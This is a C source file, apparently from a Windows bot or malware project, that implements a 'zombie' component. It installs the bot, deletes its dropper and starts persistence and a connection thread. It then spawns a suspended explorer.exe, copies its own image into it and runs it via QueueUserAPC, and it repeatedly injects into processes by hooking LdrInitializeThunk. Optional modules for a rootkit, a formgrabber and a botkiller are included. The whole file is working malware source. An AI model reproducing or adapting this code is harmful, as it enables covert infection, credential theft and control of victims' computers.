#include "../common/bot_structs.h"
#include "../common/api.h"
#include "../common/mem.h"
#include "inject.h"
#include "../common/utils.h"
#include "install.h"
#include "connection.h"
#include "modules.h"
#include "../common/string.h"
#include "zombie.h"

#include "..\common\hooking.h"
#include "..\common\inject.h"

#ifdef MODULE_ROOTKIT
#include "rootkit.h"
#include "ipc.h"
#include "pipes.h"

#include "file_persistence.h"

#ifdef MODULE_BOTKILLER
#include "botkiller.h"
#endif

#ifdef MODULE_FORMGRABBER
#include "formgrabber.h"
#endif

#ifdef MODULE_DEBUG
#include "debug.h"
#endif
#endif

extern bot_t bot;

DWORD WINAPI ZombieEntryPoint(bot_t* pBot)
{
	BOOL bInfectedSystem = FALSE;

#ifdef MODULE_DEBUG
	InitDebug();
#endif

	bot = *pBot;

	bot.crc.crc32Initialized = FALSE;

	//g_Bot.crc.crc32Intalized = FALSE;

	if (!InitializeAPI())
	{
		return TRUE;
	}

	if (!IsSystemInfected())
	{
		InstallVulture();

		while (!CWA(DeleteFileW)(bot.wzBotPath))
			Utils_Sleep(500);

		CWA(ExitProcess)(0);
	}

#ifdef MODULE_ROOTKIT
	StartFilePersistence();
#endif

	StartConnectionThread(&bot);

#ifdef MODULE_ROOTKIT
	InitPipes();
	RunIPCServer();
	bot.dwZombiePID = CWA(GetCurrentProcessId)();
#endif
	while (TRUE)
	{
#ifdef MODULE_ROOTKIT
		if (IsOperatingSystem64Bit())
			InjectAll();
		else
		{
			if (bInfectedSystem == FALSE)
			{
				InjectAll();
				bInfectedSystem = TRUE;
			}
		}
#endif
		Utils_Sleep(5000);
	}

	return 0;
}
DWORD WINAPI ZombieEntryPointEnd(void) { return 0; }

DWORD WINAPI dwOtherEntryPoint(LPVOID p)
{
	DWORD dwAddress;

	bot.crc.crc32Initialized = FALSE;

	//g_Bot.crc.crc32Intalized = FALSE;

	if (!InitializeAPI())
	{
		return TRUE;
	}

	#ifdef MODULE_DEBUG
		InitDebug();
	#endif

	WDEBUG("Testing 1");

	WDEBUG("Testing 2");

	WDEBUG("Testing 3");

	WDEBUG("Testing 4");

//#ifdef MODULE_ROOTKIT
//	InstallRootkit();
//	/*InitPipes();
//	RunIPCClient();
//*/
//#ifdef MODULE_FORMGRABBER
//	InstallFormgrabberHooks();
//#endif
//#endif

	dwAddress = (DWORD)GetProcAddress(bot.modules.hNtdll, "LdrInitializeThunk");

	oLdrInitializeThunk = (ptLdrInitializeThunk)HookRemoteFunction(CURRENT_PROCESS, bot.modules.hNtdll, HASH_NTDLL_LDRINITIALIZETHUNK, LdrInitializeThunk_Callback, &dwLdrInitializeThunkSize);

	UnhookFunctionByOriginal(oLdrInitializeThunk, dwLdrInitializeThunkSize);
	
	return 0;
}

BOOL CreateZombieEx(LPTHREAD_START_ROUTINE start)
{
	PROCESS_INFORMATION pi;
	STARTUPINFOW si;
	LPWSTR pwzExplorerPath;
	bot_t botData;
	void* pRemoteBotData;
	BOOL bZombie;
	HMODULE hMod, hLocalMod;
	LPTHREAD_START_ROUTINE pEntryPoint;

	if ((pwzExplorerPath = GetExplorerPath()) == NULL)
		return FALSE;

	bZombie = FALSE;

	memzero(&pi, sizeof(PROCESS_INFORMATION));
	memzero(&si, sizeof(STARTUPINFOW));

	//si.cb = sizeof(STARTUPINFOW);

	if (bot.api.pCreateProcessW(pwzExplorerPath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
	{
		botData = bot;

		hLocalMod = bot.api.pGetModuleHandleW(NULL);

		if ((hMod = CopyModule(pi.hProcess, hLocalMod)) != 0)
		{
			pEntryPoint = (LPTHREAD_START_ROUTINE)((LPBYTE)hMod + (DWORD_PTR)((LPBYTE)start - (LPBYTE)hLocalMod));

			if ((pRemoteBotData = InjectData(pi.hProcess, &botData, sizeof(bot_t))) != NULL)
			{
				bot.api.pQueueUserAPC(pEntryPoint, pi.hThread, pRemoteBotData);
				bot.api.pResumeThread(pi.hThread);

				bZombie = TRUE;
			}
		}

		bot.api.pCloseHandle(pi.hThread);
		bot.api.pCloseHandle(pi.hProcess);
	}

	return bZombie;
}

BOOL CreateZombie(void)
{
	return CreateZombieEx(ZombieEntryPoint);
}

DWORD WINAPI Entrypoint_Uninstall(bot_t* pBot)
{
	bot_t bot = *pBot;

	if (!InitializeAPI())
	{
		return TRUE;
	}

	while (!bot.api.pDeleteFileW(bot.wzBotPath))
	{
		Utils_Sleep(1000);
	}

	bot.api.pExitProcess(0);

	return 0;
}

BOOL CreateZombieUninstall(void)
{
	if (!CreateZombieEx(Entrypoint_Uninstall))
		return FALSE;
	return TRUE;
}

void WINAPI InjectAll(void)
{
	InjectBot(dwOtherEntryPoint);
}